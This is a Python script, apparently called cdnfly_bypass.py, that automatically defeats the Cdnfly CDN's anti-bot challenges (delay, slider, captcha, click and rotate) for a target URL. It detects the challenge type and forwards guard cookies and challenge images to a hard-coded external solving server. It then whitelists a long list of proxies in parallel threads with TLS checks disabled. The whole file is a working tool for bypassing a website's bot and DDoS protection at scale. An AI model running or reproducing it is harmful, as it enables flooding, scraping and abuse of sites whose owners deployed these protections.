from concurrent.futures import ThreadPoolExecutor
import requests
import sys
import base64
import time
import hashlib
import json
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

api_url = 'http://51.81.135.251:8964/'


def get_website_status(res):
    # status_mapping = {
    #     '<script src="/_guard/html.js?js=delay_jump_html"></script>': "delay_jump_html",
    #     '<script src="/_guard/auto.js"></script>': "auto",
    #     '<script src="/_guard/html.js?js=slider_html"></script>': "slider_html",
    #     '<script src="/_guard/html.js?js=captcha_html"></script>': "captcha_html",
    #     '<script src="/_guard/html.js?js=click_html"></script>': "click_html",
    #     '<script src="/_guard/html.js?js=rotate_html"></script>': "rotate_html"
    # }
    status_mapping = ["delay_jump_html", "slider_html", "captcha_html", "click_html", "rotate_html"]
    for status in status_mapping:
        if "auto.js" in res.text:
            return "auto"
        if status in res.text:
            return status
    return None


def get_time():
    return int(time.time() * 1000)


def get_img_md5(img):
    m = hashlib.md5()
    m.update(img)
    return m.hexdigest()


def get_delay_jump_html(guard):
    payload = json.dumps({"guard": guard})
    res = requests.post(api_url + 'delay_jump', data=payload)
    return json.loads(res.text)['guardret']


def get_auto(guard):
    payload = json.dumps({"guard": guard})
    res = requests.post(api_url + 'auto', data=payload)
    return json.loads(res.text)['guardret']


def get_slider_html(guard):
    payload = json.dumps({"guard": guard})
    res = requests.post(api_url + 'slider', data=payload)
    return json.loads(res.text)['guardret']


def get_captcha_html(guard, img, md5):
    payload = json.dumps({"guard": guard, "md5": md5, "image": img})
    res = requests.post(api_url + 'captcha', data=payload, timeout=5)
    return json.loads(res.text)['guardret']


def get_click_html(guard):
    payload = json.dumps({"guard": guard})
    res = requests.post(api_url + 'click', data=payload)
    return json.loads(res.text)['guardret']


def get_rotate_html(guard, img, md5):
    payload = json.dumps({"guard": guard, "md5": md5, "image": img})
    res = requests.post(api_url + 'rotate', data=payload, timeout=5)
    return json.loads(res.text)['guardret']


def task(url, proxy):
    proxies = {
        'http': 'http://' + proxy,
        'https': 'http://' + proxy,
    }
    session = requests.session()
    try:
        res = session.get(url, proxies=proxies, timeout=3, verify=False)
    except requests.exceptions.ProxyError:
        print(f"proxy {proxy} unavailable")
        return
    website_status = get_website_status(res)
    if not website_status:
        print(f"Passed white or non-cdnfly {proxy}")
    if website_status == "delay_jump_html":
        print(f"proxy{proxy}delay_jump_html")
        guard = session.cookies['guard']
        guardret = get_delay_jump_html(guard)
        session.cookies['guardret'] = guardret
        time.sleep(5)
        res = session.get(url, proxies=proxies, timeout=5, verify=False)
        print(f"proxy{proxy}Successful whitelisting")
    elif website_status == "auto":
        print(f"proxy{proxy}auto")
        guard = session.cookies['guard']
        guardret = get_auto(guard)
        session.cookies['guardret'] = guardret
        res = session.get(url, proxies=proxies, timeout=5, verify=False)
        print(f"proxy{proxy}Successful whitelisting")
    elif website_status == "slider_html":
        print(f"proxy{proxy}slider_html")
        guard = session.cookies['guard']
        guardret = get_slider_html(guard)
        session.cookies['guardret'] = guardret
        res = session.get(url, proxies=proxies, timeout=5, verify=False)
        print(f"proxy{proxy}Successful whitelisting")
    elif website_status == "captcha_html":
        print(f"proxy{proxy}captcha_html")
        img = session.get(url + '/_guard/captcha.png', proxies=proxies, verify=False)
        img_base64 = base64.b64encode(img.content).decode('utf-8')
        guard = session.cookies['guard']
        md5 = get_img_md5(img.content)
        guardret = get_captcha_html(guard, img_base64, md5)
        session.cookies['guardret'] = guardret
        res = session.get(url, proxies=proxies, timeout=5, verify=False)
        print(f"proxy{proxy}Successful whitelisting")
    elif website_status == "click_html":
        print(f"proxy{proxy}click_html")
        guard = session.cookies['guard']
        guardret = get_click_html(guard)
        session.cookies['guardret'] = guardret
        res = session.get(url, proxies=proxies, timeout=5, verify=False)
        print(f"proxy{proxy}Successful whitelisting")
    elif website_status == "rotate_html":
        print(f"proxy{proxy}rotate_html")
        retry_times = 0
        while retry_times < 3:
            img = session.get(url + f'_guard/rotate.jpg?t={get_time()}', proxies=proxies, timeout=5, verify=False)
            img_base64 = base64.b64encode(img.content).decode('utf-8')
            guard = session.cookies['guard']
            md5 = get_img_md5(img.content)
            guardret = get_rotate_html(guard, img_base64, md5)
            session.cookies['guardret'] = guardret
            res = session.get(url, proxies=proxies, timeout=5, verify=False)
            retry_times += 1
            if "rotate_html" not in res.text:
                print(f"proxy{proxy}Successful whitelisting")
                return


if len(sys.argv) != 4:
    print("parameter error")
    print("python3 cdnfly_bypass.py url proxy_file thread")
    sys.exit(1)

url = sys.argv[1]
if url[-1] != '/':
    url += '/'
proxy_file = sys.argv[2]
with open(proxy_file, mode='r', encoding='utf-8') as f:
    proxy_list = f.readlines()
thread = int(sys.argv[3])

# Debug

# url = 'https://www.yilann.com/'
# proxy_list = ['127.0.0.1:7890']
# with open('proxy.txt', mode='r', encoding='utf-8') as f:
#     proxy_list = f.readlines()
# thread = 128

proxy_list = [proxy.strip() for proxy in proxy_list]
print(len(proxy_list), proxy_list)

pool = ThreadPoolExecutor(max_workers=thread)
for proxy in proxy_list:
    pool.submit(task, url, proxy)
pool.shutdown(wait=True)

print("Whitelist completion")
